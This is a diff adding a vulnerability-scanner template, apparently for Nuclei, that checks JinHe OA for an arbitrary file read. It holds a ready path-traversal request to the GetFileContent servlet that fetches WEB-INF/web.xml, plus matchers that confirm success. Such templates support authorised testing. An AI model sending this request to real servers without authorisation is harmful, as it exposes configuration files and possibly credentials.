@@ -1,0 +1,27 @@
+id: JinHeOA-GetFileContent-ReadAnyFile
+
+info:
+  name: JinHeOA-GetFileContent-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    JinHeOA-GetFileContent-ReadAnyFile
+
+http:
+  - raw:
+      - |
+        GET /jc6/servlet/WebBill?key=GetFileContent&pathfile=/../WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <?xml version="1.0"
+          - <param-value
+        condition: and
+
+      - type: status
+        status:
+          - 200
